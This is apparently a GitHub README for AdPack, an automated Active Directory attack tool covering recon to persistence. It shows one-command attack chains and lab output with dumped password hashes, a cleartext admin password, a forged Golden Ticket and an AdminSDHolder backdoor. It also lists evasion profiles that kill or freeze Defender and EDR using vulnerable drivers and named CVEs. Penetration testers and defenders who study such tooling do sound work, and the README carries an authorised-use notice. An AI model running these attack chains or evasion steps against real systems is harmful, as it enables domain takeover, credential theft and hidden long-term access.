<p align="center">
  <img src="AdPackBanner.jpg" alt="AdPack Banner" width="100%">
</p>

<h3 align="center">State-aware Active Directory attack orchestration</h3>

<p align="center">
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-white?style=for-the-badge&logo=opensourceinitiative&logoColor=black" alt="License">
  </a>
  <a href="https://go.dev">
    <img src="https://img.shields.io/badge/Go-1.25+-black?style=for-the-badge&logo=go&logoColor=white" alt="Go">
  </a>
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20WSL-white?style=for-the-badge&logo=linux&logoColor=black" alt="Platform">
  <a href="https://github.com/Yenn503/AdPack/releases">
    <img src="https://img.shields.io/badge/Version-0.3.0--dev-black?style=for-the-badge&logo=semver&logoColor=white" alt="Version">
  </a>
  <a href="https://app.devin.ai/org/yenn503/wiki/Yenn503/AdPack?branch=main">
    <img src="https://img.shields.io/badge/Wiki-white?style=for-the-badge&logo=readthedocs&logoColor=black" alt="Devin Wiki">
  </a>
</p>

<p align="center">
  <a href="#-quick-start"><img src="https://img.shields.io/badge/⚡_Quick_Start-black?style=for-the-badge" alt="Quick Start"></a>
  <a href="#-features"><img src="https://img.shields.io/badge/⚪_Features-white?style=for-the-badge" alt="Features"></a>
  <a href="#-evasion-profiles"><img src="https://img.shields.io/badge/⚫_Evasion-black?style=for-the-badge" alt="Evasion"></a>
  <a href="#-documentation"><img src="https://img.shields.io/badge/⚪_Docs-white?style=for-the-badge" alt="Docs"></a>
  <a href="#-installation"><img src="https://img.shields.io/badge/⚫_Install-black?style=for-the-badge" alt="Install"></a>
</p>

<br>

> [!IMPORTANT]
> **Authorised Use Only** — This tool is designed for legitimate security assessments and penetration testing with explicit written authorisation. Unauthorised access to computer systems is illegal.

<br>

## ⚫ Overview

adpack runs AD attacks through 9 phases. Tracks hosts, users, creds, and sessions in SQLite. Detects gaps, suggests next steps, and goes from recon to domain admin.

### ⚪ Capabilities

- **Smart Phase Tracking** — Detects missing data and suggests what to run next
- **13 Evasion Profiles** — Go wrappers for advanced techniques including Nightmare Eclipse methods
- **Multi-Protocol Validation** — Tests creds across SMB, LDAP, WinRM, RDP
- **Persistent State** — SQLite survives crashes and resumes sessions
- **One-Command Setup** — `./setup.sh` installs core tools and creates config

---

## Quick Start

```bash
# Clone and install
git clone https://github.com/Yenn503/AdPack.git
cd adpack && ./setup.sh && source ~/.bashrc

# Automated attack chain
adpack autorun --target 10.0.0.5 --max 5
```

### Manual Workflow

```bash
adpack status                          # View current state
adpack run discovery -t 10.0.0.5       # Discover domain controllers
adpack run enumeration -t 10.0.0.5     # Enumerate users and computers
adpack run credential_acq -t 10.0.0.5  # Extract credentials
adpack validate                        # Test credentials across protocols
adpack run lateral -t 10.0.0.6         # Lateral movement
```

**Example output from GOAD-Light (2026-05-20):**

```
  ────────────────────────────────────────────────────
  AUTO-RUN  ·  Automated Attack Chain
  Target:  192.168.57.10
  Limit:   9 phases
  ────────────────────────────────────────────────────

  →  Seeded creds: sevenkingdoms.local\Administrator
  [1]  DISCOVERY
      No hosts found. Run nmap sweep or specify targets.

[+] Host added from target flag: 192.168.57.10
      ✓  1 host(s) discovered
         ·  192.168.57.10 [DC]

      ✓ complete  ·  851ms

  [2]  ENUMERATION
      Hosts=1, Users=0, Computers=0. Enumerate AD objects via LDAP or NetExec.

[*] Enumerating users on 192.168.57.10 (sevenkingdoms.local)...
[+] Enumerated 15 users
      ✓  15 user(s) enumerated

      ✓ complete  ·  1.026s

  [3]  CREDENTIAL_ACQ
      Users=15, Creds=1. Try Kerberoast, AS-REP, spray, LSASS.

      →  Kerberos pre-check...
[*] AS-REP roasting against 192.168.57.10...
[+] AS-REP: 0 roastable users found
[*] Kerberoasting against 192.168.57.10...
[+] Kerberoast: 1 SPN accounts found
[*] Using evasion profile: standard
[*] Target: 192.168.57.10 (KINGSLANDING)
[*] Primary pipeline failed, trying DCSync via impacket-secretsdump...
[*] DCSync via impacket-secretsdump against 192.168.57.10...
[+] Secretsdump: 17 credentials found
      ✓  17 credential(s) acquired
         ·  sevenkingdoms.local\Administrator  c66d72021a2d4744409969a581a1705e
         ·  sevenkingdoms.local\Guest          31d6cfe0d16ae931b73c59d7e0c089c0
         ·  sevenkingdoms.local\krbtgt         95adcbce290dd623b98f9e6907287d8f

      ✓ complete  ·  1.28s

  [4]  SESSION_HARVEST
      Validated creds but no sessions. Hunt sessions via NetExec SMB/LDAP.

[*] Harvesting sessions...
         host identity unresolved (non-machine or empty): sevenkingdoms.local\Administrator
[+] Identity drift snapshot: {"resolved":0,"unresolved":1,...}
[+] Harvested 1 sessions
      ✓  1 session(s) harvested

      ✓ complete  ·  1.046s

  [5]  GRAPH_ANALYSIS
      Enumerated data collected. Run BloodHound for attack paths.

[*] Enumerating computers...
[+] 1 computers enumerated
[*] Enumerating GPOs...
[*] LDAP GPO listing empty, trying ldapsearch fallback...
[+] 2 GPOs enumerated
[*] Enumerating ADCS certificate templates...
[+] 2 ADCS templates found
      ✓  1 computer(s), 2 GPO(s), 2 ADCS template(s)

      ✓ complete  ·  2.696s

  [6]  LATERAL
      Creds+sessions ready. Move laterally via WinRM/WMI/PSExec.

[*] Trying SMB on 192.168.57.10...
  ✓  SMB succeeded
[*] Trying PSExec on 192.168.57.10...
  ✓  PSExec succeeded
[*] Trying Schtasks on 192.168.57.10...
  ✓  Schtasks succeeded
[*] Trying WMI on 192.168.57.10...
  ✓  WMI succeeded
[*] Trying WinRM on 192.168.57.10...
  ✓  WinRM succeeded

      ✓ complete  ·  47.672s

  [7]  VALIDATION
      18 creds to validate. Test auth via SMB/LDAP/WinRM.

[*] Validating 18 credentials against 1 hosts...
[*] Skipping already validated: sevenkingdoms.local\Administrator
[*] [2/18] Validating sevenkingdoms.local\Administrator
  [+] Valid on: SMB, LDAP, WinRM [ADMIN]
  [+] Accessible hosts: 1
[*] [3/18] Validating sevenkingdoms.local\Guest
  [+] Valid on: SMB, LDAP, WinRM
  [+] Accessible hosts: 1
[*] [4/18] Validating sevenkingdoms.local\krbtgt
  [+] Valid on: SMB, LDAP, WinRM
  [+] Accessible hosts: 1
...
[*] [18/18] Validating sevenkingdoms.local\NORTH$
  [+] Valid on: SMB, LDAP, WinRM
  [+] Accessible hosts: 1
[+] Validation complete: 17/18 valid (3 admin)

      ✓ complete  ·  49.952s

  [8]  PRIVESC
      Check ACL abuse, ADCS, RBCD, GPP for privilege escalation.

[*] Checking GPP passwords in SYSVOL...
[*] Checking ACL abuse paths...
[*] Checking ADCS vulnerable templates...
[+] ADCS output: LDAP 192.168.57.10 389 KINGSLANDING
     [+] sevenkingdoms.local\Administrator:8dCT-DJjgScp (Pwn3d!)
     ADCS Found PKI Enrollment Server: kingslanding.sevenkingdoms.local
     ADCS Found CN: SEVENKINGDOMS-CA
[*] Checking RBCD...
[+] SYSTEM access confirmed on 192.168.57.10 (smbexec)
      ✓  Privesc checks completed

      ✓ complete  ·  14.127s

  [9]  PERSISTENCE
      Establish persistence: krbtgt, DSRM, skeleton, admin SDHolder.

[*] Creating scheduled task persistence (onlogon, SYSTEM)...
[+] Scheduled task created via wmiexec
[*] Enabling DSRM password-reuse logon (registry)...
[+] DSRM logon behavior set to 2 via wmiexec
[*] Forging Golden Ticket (secretsdump krbtgt → impacket-ticketer)...
[+] Golden Ticket forged: /tmp/golden_svc_health_1779315159.ccache
    use: export KRB5CCNAME=/tmp/golden_svc_health_1779315159.ccache
[*] Backdooring AdminSDHolder (GenericAll → SDProp propagation)...
[+] AdminSDHolder GenericAll granted to Administrator (impacket-dacledit)
[+] 4 persistence mechanism(s) deployed
      ✓  Persistence mechanisms deployed

      ✓ complete  ·  24.912s


  ■  Limit reached (9 phases executed)
  ────────────────────────────────────────────────────
  ■  9 phases executed  ·  1 hosts  ·  15 users  ·  18 creds (17 validated)
```


---

## ⚪ Features

### Intel & Orchestration
- Tracks state and detects missing data
- Scores evidence quality
- Skips phases when DA creds found
- TUI dashboard and JSON export

### Credential Operations
- LSASS dumping via nanodump with 11+ evasion pipelines (fork, snapshot, WER, BOF, BYOVD, coldwer, MiniPlasma) and automatic fallback to DCSync via impacket-secretsdump
- Kerberoasting and AS-REP roasting
- Multi-protocol validation (SMB, LDAP, WinRM, RDP)
- Detects admin rights and checks if lateral movement works

### Evasion 
- 13 profiles from basic to advanced techniques
- Orchestrates Nightmare Eclipse methods (BlueHammer, UnDefend)
- BYOVD kernel access and EDR freezing workflows
- In-memory execution via Donut and BOF integration

### Automation
- Auto-run with depth limit
- BloodHound integration
- Evidence tracking with timestamps
- Colour-coded CLI output

---

## ⚫ Attack Phases

9 phases from recon to persistence:

<div align="center">

<table>
<tr>
<td align="center"><strong>01. Discovery</strong><br><sub>Find domain controllers and network topology</sub></td>
<td align="center">→</td>
<td align="center"><strong>02. Enumeration</strong><br><sub>Collect users, computers, groups via LDAP</sub></td>
<td align="center">→</td>
<td align="center"><strong>03. Credential Acquisition</strong><br><sub>Extract creds using selected evasion profile</sub></td>
</tr>
<tr>
<td colspan="5" align="center">↓</td>
</tr>
<tr>
<td align="center"><strong>04. Session Harvesting</strong><br><sub>Find active user sessions on domain systems</sub></td>
<td align="center">→</td>
<td align="center"><strong>05. Graph Analysis</strong><br><sub>Map attack paths with BloodHound</sub></td>
<td align="center">→</td>
<td align="center"><strong>06. Lateral Movement</strong><br><sub>Move between systems using validated creds</sub></td>
</tr>
<tr>
<td colspan="5" align="center">↓</td>
</tr>
<tr>
<td align="center"><strong>07. Validation</strong><br><sub>Test creds across SMB, LDAP, WinRM, RDP</sub></td>
<td align="center">→</td>
<td align="center"><strong>08. Privilege Escalation</strong><br><sub>Exploit ACLs, ADCS, RBCD, GPP misconfigs</sub></td>
<td align="center">→</td>
<td align="center"><strong>09. Persistence</strong><br><sub>Golden Ticket, DSRM, long-term access</sub></td>
</tr>
</table>

</div>

---

## ⚪ Evasion Profiles

13 profiles orchestrating techniques from basic to advanced:

| Profile | Technique | Detection Risk | Use Case |
|---------|-----------|:--------------:|----------|
| `minimal` | Donut + go-mimikatz | 🟡 Medium | Lab environments |
| `standard` | Donut + go-mimikatz (remote) | 🟡 Medium | Enterprise with Defender |
| `aggressive` | BOF + nanodump | 🟢 Low | C2 integration |
| `bypass` | Multi-stack evasion with pre-flight | 🟢 Low | Full chain runs |
| `bof` | BOF injection (standalone) | 🟢 Low | In-memory execution |
| `fork` | nanodump --fork | 🟢 Low | LSASS process cloning |
| `byovd` | RTCore64.sys | 🟢 Very Low | Kernel-level PPL bypass |
| `coldwer` | EDR-Freeze | 🟢 Very Low | EDR blind spot |
| `undefend` | UnDefend | 🟢 Low | Defender termination |
| `bluehammer` | CVE-2026-33825 | 🟢 Very Low | Unprivileged SAM dump (requires Windows VS 2022 build) |
| `phantomkiller` | BootRepair.sys BYOVD | 🟢 Very Low | PPL-protected EDR kill |
| `miniplasma` | Cloud Filter EoP (CVE-2020-17103) | 🟢 Very Low | Kernel-adjacent SYSTEM path, independent of service/task primitives |
| `custom` | User-defined pipeline | 🟡 Medium | Custom configurations |

### ⚫ Tool Provenance

Tools are acquired through three distinct methods depending on their build ecosystem:

| Tier | Method | Tools |
|------|--------|-------|
| **Cross-compiled** | Built from source during setup via MinGW | UnDefend |
| **Release binary** | Downloaded as pre-built artifact from GitHub | PhantomKiller, MiniPlasma |
| **Windows-native** | Requires Visual Studio 2022 on Windows; not buildable from Linux | BlueHammer |

Setup is best-effort — availability is environment-dependent.

### ⚫ Evasion & Post-Exploitation (Recent 2026 AV/EDR methods)

Orchestrates techniques from the **Nightmare Eclipse leaks** (disclosed Q1 2026). Requires tool binaries:

#### ⚡ BlueHammer (CVE-2026-33825)
Defender RPC bug. Dumps SAM without admin rights via VSS snapshots. No LSASS alerts. Deploys FunnyApp.exe. **Build blocked cross-platform** — requires Visual Studio 2022 on Windows (MSVC, RPC IDL, Windows SDK). No pre-built binary available.

#### ⚡ UnDefend
Kills Defender via service dependency exploit. Bypasses tamper protection. Deploys UnDefend.exe. Cross-compiled from source during setup.

#### ⚡ MiniPlasma
Cloud Filter API race (CVE-2020-17103). Spawns SYSTEM shell via WER task + named pipe. Independent SYSTEM primitive — uses a kernel-adjacent race path rather than service/task creation, so it works when those control-plane primitives are hardened or monitored. Deploys MiniPlasma.exe.

#### ⚡ ColdWer
WerFaultSecure PPL bypass. Freezes EDR processes during dump. EDR can't see it. Deploys EDR-Freeze.exe.

#### ⚡ PhantomKiller
Lenovo BootRepair.sys BYOVD. IOCTL 0x222014 terminates any process, including PPL-protected EDR using a signed driver. Deploys PhantomKiller.exe + PhantomKiller.sys. Pre-built binary downloaded from GitHub release during setup.

**Legal & Ethical Notice:** Use of BYOVD (Bring Your Own Vulnerable Driver) techniques and exploitation tools must only be performed on systems you are explicitly authorized to test. Verify the provenance and legality of all tools before use. Unauthorized access to computer systems is illegal.

**Example:**

```bash
adpack run credential_acq -e standard -t 10.0.0.5          # Standard LSASS dump
adpack run credential_acq -e coldwer -t 10.0.0.5           # Freeze EDR + dump
adpack run credential_acq -e phantomkiller -t 10.0.0.5     # BYOVD EDR kill + dump
adpack run credential_acq -e miniplasma -t 10.0.0.5        # SYSTEM shell (cloud filter race path) + LSASS
adpack validate                                             # Validate creds
adpack run lateral -t 10.0.0.6                             # Lateral movement
```

---

## ⚫ Environment

**Build environment**: Windows + WSL2 (Ubuntu). Go builds, MinGW cross-compilation, and all Linux tooling run from WSL2, with Visual Studio 2022 on the Windows side for the one tool that needs MSVC (BlueHammer).

**Deployment**: adpack is a single Go binary — compile once and deploy to any Linux host (Kali, C2 server, attack VM). Pre-built Windows tool binaries (PhantomKiller, MiniPlasma, UnDefend) are copied alongside; no WSL2 or Windows dependency at runtime.

Tested on **DreadGOAD-Light** (3 VMware VMs, 2 forests) running locally.

## ⚫ Installation

### Automated Setup

```bash
git clone https://github.com/Yenn503/AdPack.git
cd adpack
./setup.sh
source ~/.bashrc
```

<table>
<tr>
<td><strong>Installs</strong></td>
<td>Go 1.25+, NetExec, Donut, go-mimikatz, pypykatz, ScareCrow, nanodump, adpack binary, default config. Clones and builds evasion tool binaries (UnDefend, BlueHammer, PhantomKiller, MiniPlasma) where build toolchains are available.</td>
</tr>
<tr>
<td><strong>Time</strong></td>
<td>~5-10 minutes</td>
</tr>
<tr>
<td><strong>Note</strong></td>
<td>Some tools cross-compiled from source; BlueHammer requires Windows VS 2022 build. See SETUP.md.</td>
</tr>
</table>

### ⚪ Manual Installation

See [SETUP.md](SETUP.md) for manual install.

---

## ⚫ Configuration

Create `~/.adpack/config.yaml` (or use setup.sh generated config):

```yaml
db_path: "~/.adpack/state.db"

nxc_path: "netexec"
bh_python: "bloodhound-python"

viper:
  enabled: false
  host: "localhost"
  port: 7687
```

**Note**: Credentials are encrypted at rest using AES-GCM in the SQLite database. Encryption keys are persisted as per-database random 32-byte keys stored in corresponding `.key` files (e.g., `~/.adpack/state.db.key`). Protect both `~/.adpack/state.db` and its `.key` file with appropriate file permissions (600), use disk encryption for sensitive engagements, and ensure both files are stored securely.

---

## ⚪ Testing Environments

All 9 phases — discovery, enumeration, credential_acq, session_harvest, graph_analysis, lateral, validation, privesc, persistence — have been run and verified end-to-end on these labs:

| Lab | Source | Environment |
|-----|--------|-------------|
| **DreadGOAD-Light** | [dreadnode/DreadGOAD](https://github.com/dreadnode/DreadGOAD) | 3 VMware VMs, 2 forests, 7kingdoms.local + north.sevenkingdoms.local |
| **VulnAD** | [OctoRig](https://github.com/CommonHuman-Lab/OctoRig) | Single Docker container, vulnad.local |

---

## ⚫ Documentation

<table>
<tr>
<td width="25%"><a href="USAGE.md"><strong>USAGE.md</strong></a></td>
<td>Complete command reference, workflows, and examples</td>
</tr>
<tr>
<td><a href="SETUP.md"><strong>SETUP.md</strong></a></td>
<td>Installation guide and environment setup</td>
</tr>
<tr>
<td><a href="CONTEXT.md"><strong>CONTEXT.md</strong></a></td>
<td>Domain language, architecture, and design decisions</td>
</tr>
<tr>
<td><a href="CONTRIBUTING.md"><strong>CONTRIBUTING.md</strong></a></td>
<td>Development guidelines and contribution process</td>
</tr>
</table>

---

<div align="center">

## ⚪ License

MIT License - see [LICENSE](LICENSE)

## ⚫ Contributing

PRs welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) first.

---

<img src="https://img.shields.io/badge/AdPack-v0.3.0--dev-black?style=for-the-badge&logo=github&logoColor=white" alt="AdPack">

<br>

<a href="https://github.com/Yenn503/AdPack/issues"><img src="https://img.shields.io/badge/⚫_Report_Bug-white?style=for-the-badge" alt="Report Bug"></a>
<a href="https://github.com/Yenn503/AdPack/issues"><img src="https://img.shields.io/badge/⚪_Request_Feature-black?style=for-the-badge" alt="Feature"></a>
<a href="USAGE.md"><img src="https://img.shields.io/badge/⚫_Documentation-white?style=for-the-badge" alt="Docs"></a>

<br>
<br>

<sub>Made by JYenn</sub>

</div>
